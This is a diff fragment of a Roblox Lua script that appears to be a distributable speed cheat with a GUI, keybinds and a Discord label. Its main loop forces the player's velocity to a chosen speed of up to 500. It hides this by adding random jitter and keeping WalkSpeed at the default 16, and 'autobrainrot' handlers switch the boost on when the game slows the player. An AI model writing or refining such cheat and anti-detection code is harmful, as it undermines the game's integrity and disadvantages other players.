+miniStatusBtn.MouseButton1Click:Connect(function()
+    if currentVersion == "v1" then
+        setEnabled(not enabled)
+    else
+        v2SetActive(not v2Enabled)
+    end
+end)
+
+v1Btn.MouseButton1Click:Connect(function()
+    if currentVersion == "v1" then return end
+    v2SetActive(false)
+    currentVersion = "v1"
+    applyVersionUI()
+    applyPopupVersionUI()
+    setEnabled(false)
+end)
+
+v2Btn.MouseButton1Click:Connect(function()
+    if currentVersion == "v2" then return end
+    setEnabled(false)
+    currentVersion = "v2"
+    applyVersionUI()
+    applyPopupVersionUI()
+    v2SetActive(false)
+end)
+
+local lastMoveDir = Vector3.new(0,0,0)
+local rng = Random.new()
+
+RunService.RenderStepped:Connect(function()
+    if currentVersion ~= "v1" then return end
+    if not speedEnabled then return end
+    if not enabled then return end
+
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then return end
+
+    local st = hum:GetState()
+    if hum.PlatformStand
+       or st == Enum.HumanoidStateType.Physics
+       or st == Enum.HumanoidStateType.Ragdoll
+       or st == Enum.HumanoidStateType.FallingDown
+       or st == Enum.HumanoidStateType.Dead then
+        return
+    end
+
+    local targetSpeed = tonumber(speedBox.Text) or 49
+    if targetSpeed < 10 then targetSpeed = 10 end
+    if targetSpeed > 500 then targetSpeed = 500 end
+
+    local md = hum.MoveDirection
+    if md.Magnitude > 0.05 then lastMoveDir = md end
+
+    local dir = nil
+    if md.Magnitude > 0.05 then
+        dir = md
+    elseif lastMoveDir.Magnitude > 0 then
+        local keys = {Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
+                      Enum.KeyCode.Up, Enum.KeyCode.Down, Enum.KeyCode.Left, Enum.KeyCode.Right}
+        for _, k in ipairs(keys) do
+            if UIS:IsKeyDown(k) then dir = lastMoveDir break end
+        end
+    end
+
+    pcall(function() root:SetNetworkOwner(player) end)
+
+    local j = rng:NextNumber(-0.1, 0.1)
+    local vy = root.AssemblyLinearVelocity.Y
+
+    if dir and dir.Magnitude > 0.05 then
+        local u = dir.Unit
+        root.AssemblyLinearVelocity = Vector3.new(
+            u.X * targetSpeed + j,
+            vy,
+            u.Z * targetSpeed + j
+        )
+    else
+        root.AssemblyLinearVelocity = Vector3.new(0, vy, 0)
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if currentVersion ~= "v1" then return end
+    if not speedEnabled or not enabled then return end
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end
+end)
+
+local lastBrainrotState = false
+RunService.Heartbeat:Connect(function()
+    if currentVersion ~= "v1" then lastBrainrotState = false return end
+    if not autoBrainrot then lastBrainrotState = false return end
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    local slowed = hum.WalkSpeed < 25
+    if slowed and not lastBrainrotState then
+        lastBrainrotState = true
+        if not enabled then setEnabled(true) end
+    elseif not slowed and lastBrainrotState then
+        lastBrainrotState = false
+        if enabled then setEnabled(false) end
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if currentVersion ~= "v2" then v2LastBrainrotState = false return end
+    if not cfg.autoBrainrot then v2LastBrainrotState = false return end
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    local slowed = hum.WalkSpeed < 25
+    if slowed and not v2LastBrainrotState then
+        v2LastBrainrotState = true
+        if not v2Enabled then v2SetActive(true) end
+    elseif not slowed and v2LastBrainrotState then
+        v2LastBrainrotState = false
+        if v2Enabled then v2SetActive(false) end
+    end
+end)
+
+changeGuiBtn.MouseButton1Click:Connect(function()
+    popup.Visible = not popup.Visible
+end)
+
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    local kc = input.KeyCode
+
+    if currentVersion == "v1" then
+        local keyName = keybindBox.Text:upper()
+        local ok, keyCode = pcall(function() return Enum.KeyCode[keyName] end)
+        if ok and keyCode and kc == keyCode then
+            setEnabled(not enabled)
+        end
+    else
+        local ok, keyCode = pcall(function() return Enum.KeyCode[cfg.keybind] end)
+        if ok and keyCode and kc == keyCode then
+            v2SetActive(not v2Enabled)
+        end
+    end
+end)
+
+local hidden = false
+clickableHide.MouseButton1Click:Connect(function()
+    hidden = not hidden
+    if hidden then
+        mainFrame:TweenSize(UDim2.new(0, 320, 0, 100), "Out", "Quad", 0.3, true)
+        changeGuiBtn.Visible = false
+        statusBtn.Visible = false
+        subtitle.Visible = false
+        profileCard.Visible = false
+        discordLabel.Visible = false
+        discordLine.Visible = false
+        versionLabel.Visible = false
+        v1Btn.Visible = false
+        v2Btn.Visible = false
+        miniStatusBtn.Visible = true
+        hideBtn.Text = "Show"
+    else
+        mainFrame:TweenSize(UDim2.new(0, 320, 0, 363), "Out", "Quad", 0.3, true)
+        miniStatusBtn.Visible = false
+        task.delay(0.3, function()
+            changeGuiBtn.Visible = true
+            statusBtn.Visible = true
+            subtitle.Visible = true
+            profileCard.Visible = true
+            discordLabel.Visible = true
+            discordLine.Visible = true
+            versionLabel.Visible = true
+            v1Btn.Visible = true
+            v2Btn.Visible = true
+        end)
+        hideBtn.Text = "Hide"
+    end
+end)
+
+for _, btn in ipairs({changeGuiBtn, statusBtn, minusBtn, plusBtn, miniStatusBtn}) do
+    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = COL_ACCENT2 end)
+    btn.MouseLeave:Connect(function()
+        if btn == statusBtn then
+            if currentVersion == "v1" and enabled then btn.BackgroundColor3 = COL_GREEN
+            elseif currentVersion == "v2" and v2Enabled then btn.BackgroundColor3 = COL_GREEN
+            else btn.BackgroundColor3 = COL_ACCENT end
+        elseif btn == miniStatusBtn then
+            if currentVersion == "v1" and enabled then btn.BackgroundColor3 = COL_GREEN
+            elseif currentVersion == "v2" and v2Enabled then btn.BackgroundColor3 = COL_GREEN
+            else btn.BackgroundColor3 = COL_ACCENT end
+        else
+            btn.BackgroundColor3 = COL_ACCENT
+        end
+    end)
+end
